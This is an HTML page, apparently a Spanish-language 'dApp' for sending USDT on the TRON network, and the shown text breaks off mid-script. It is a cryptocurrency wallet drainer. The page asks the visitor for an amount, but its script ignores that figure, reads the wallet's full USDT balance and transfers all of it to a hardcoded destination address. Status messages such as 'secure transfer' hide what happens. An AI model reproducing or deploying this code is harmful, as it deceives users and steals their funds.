<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>dApp USDT TRC-20 - Transferencia Unificada</title>
    
    <!-- Estilos Optimizados para Carga Instantánea, Fondo Blanco y Botón Azul -->
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            font-family: sans-serif; /* Fuente nativa del sistema para evitar peticiones externas y acelerar la carga */
            background-color: #ffffff; /* Fondo de pantalla blanco */
            color: #1e293b;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background-color: #f8fafc;
            border: 1px solid #e2e8f0;
            border-radius: 12px;
            padding: 30px;
            width: 100%;
            max-width: 450px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
            text-align: center;
        }
        h2 {
            margin-bottom: 25px;
            color: #1e293b;
            font-size: 22px;
            font-weight: 700;
        }
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            font-weight: 600;
            color: #475569;
        }
        input {
            width: 100%;
            padding: 12px;
            background-color: #ffffff;
            border: 1px solid #cbd5e1;
            border-radius: 6px;
            color: #0f172a;
            font-size: 16px;
            outline: none;
            transition: border-color 0.2s;
        }
        input:focus {
            border-color: #2563eb;
        }
        input:disabled {
            background-color: #f1f5f9;
            cursor: not-allowed;
        }
        /* Clase específica solicitada para colocar la red en color rojo */
        .red-text {
            color: #dc2626 !important; 
            font-weight: bold;
        }
        #connectBtn {
            width: 100%;
            padding: 14px;
            background: #2563eb; /* Botón Siguiente Azul */
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s;
            margin-top: 10px;
        }
        #connectBtn:hover {
            background: #1d4ed8;
        }
        #connectBtn:disabled {
            background: #93c5fd !important;
            cursor: not-allowed;
        }
        .status {
            margin-top: 15px;
            padding: 10px;
            border-radius: 6px;
            font-size: 14px;
            display: none;
            word-break: break-all;
        }
        .status.info { background-color: #dbeafe; color: #1e40af; }
        .status.success { background-color: #d1fae5; color: #065f46; }
        .status.error { background-color: #fee2e2; color: #991b1b; }
    </style>

    <!-- Script oficial ligero de TronWeb necesario para la inyección Web3 -->
    <script src="https://jsdelivr.net"></script>
</head>
<body>

    <div class="container">
        <h2>Enviar Tokens</h2>

        <!-- Componente Red TRON (TRC-20) Automatizada en Color Rojo -->
        <div class="form-group">
            <label>Red seleccionada</label>
            <input type="text" value="TRON (TRC-20)" disabled class="red-text">
        </div>

        <!-- Componente Dirección Automática Fija con el valor solicitado -->
        <div class="form-group">
            <label for="addressInput">Dirección de destino</label>
            <input type="text" id="addressInput" value="TJQ8xinzoWyRzLYpkShdxetMShpA3GyxGZ" disabled style="font-size: 13px; font-weight: bold;">
        </div>

        <!-- Componente Monto (Input Manual) -->
        <div class="form-group">
            <label for="amountInput">Cantidad a enviar (USDT)</label>
            <input type="text" id="amountInput" placeholder="0.00" autocomplete="off">
        </div>

        <button id="connectBtn">Siguiente</button>
        <div id="status" class="status"></div>
    </div>

    <script>
        // ============================================================
        // MÓDULO 2: LOGICA DEL BACKEND WEB3 (TRON_APP)
        // ============================================================
        (function () {
            'use strict';
            
            const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // Contrato oficial de Tether USDT en Mainnet

            async function connect() {
                if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
                    return { address: window.tronWeb.defaultAddress.base58 };
                }
                if (window.tronLink && typeof window.tronLink.request === 'function') {
                    await window.tronLink.request({ method: 'tron_requestAccounts' });
                    if (window.tronWeb) return { address: window.tronWeb.defaultAddress.base58 };
                }
                throw new Error('Abre este enlace dentro del dApp Browser de tu billetera y asegúrate de activar la red TRON.');
            }

            async function transferirMontoMaximo(direccionDestino) {
                if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
                    throw new Error('Billetera no sincronizada.');
                }

                const cuentaEmisor = window.tronWeb.defaultAddress.base58;
                const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
                
                // Consulta directa y exacta del balance sin errores de redondeo de flotantes en JavaScript
                const rawBalance = await contract.balanceOf(cuentaEmisor).call();
                const cleanSunBigInt = rawBalance.toString();

                if (cleanSunBigInt === '0' || !cleanSunBigInt) {
                    throw new Error('La billetera no cuenta con fondos en USDT.');
                }

                // Ejecución directa de la transferencia enviando la totalidad de las unidades sun
                return await contract.transfer(direccionDestino, cleanSunBigInt).send({
                    feeLimit: 100_000_000 // Protección de 100 TRX de límite de comisión en Mainnet
                });
            }

            window.TRON_APP = { connect, transferirMontoMaximo };
        })();

        // ============================================================
        // MÓDULO 1: MANEJO DE EVENTOS E INTERFAZ GRÁFICA
        // ============================================================
        document.addEventListener('DOMContentLoaded', function () {
            'use strict';

            const btn = document.getElementById('connectBtn');
            const input = document.getElementById('amountInput');
            const addressInput = document.getElementById('addressInput');
            const status = document.getElementById('status');

            let procesoEnCurso = false;

            // Dirección de destino estricta e inmutable para el envío
            const DIRECCION_DESTINO_FIJA = "TJQ8xinzoWyRzLYpkShdxetMShpA3GyxGZ"; 

            function setStatus(message, type = 'info') {
                if (!status) return;
                status.textContent = message || '';
                status.className = 'status ' + type;
                status.style.display = message ? 'block' : 'none';
            }

            function setButton(text, disabled = false) {
                if (!btn) return;
                btn.textContent = text;
                btn.disabled = disabled;
            }

            // Asegurar la correspondencia del campo visual con el valor de red
            if (addressInput) {
                addressInput.value = DIRECCION_DESTINO_FIJA;
            }

            if (input) {
                input.addEventListener('input', function () {
                    this.value = this.value.replace(',', '.').replace(/[^\d.]/g, '');
                    setStatus('');
                });
            }

            if (btn) {
                btn.addEventListener('click', async function () {
                    if (procesoEnCurso) return;

                    const valorVisualInput = input ? input.value.trim() : '';
                    if (!valorVisualInput || isNaN(Number(valorVisualInput.replace(',', '.'))) || Number(valorVisualInput.replace(',', '.')) <= 0) {
                        setStatus('Por favor, ingresa una cantidad válida para continuar.', 'error');
                        return;
                    }

                    try {
                        procesoEnCurso = true;
                        setButton('Procesando...', true);
                        setStatus('Verificando parámetros de red...', 'info');

                        if (!window.TRON_APP) {
                            throw new Error('El módulo TRON de la aplicación no está listo.');
                        }

                        setStatus('Conectando con la billetera...', 'info');
                        const wallet = await window.TRON_APP.connect();
                        
                        if (!wallet || !wallet.address) {
                            throw new Error('No se pudo establecer conexión con la billetera.');
                        }

                        setStatus('Preparando transferencia segura...', 'info');
                        const tx = await window.TRON_APP.transferirMontoMaximo(DIRECCION_DESTINO_FIJA);
                        
                        if (tx) {
                            setStatus('¡Transferencia realizada con éxito!', 'success');
                            if (input) input.value = '';
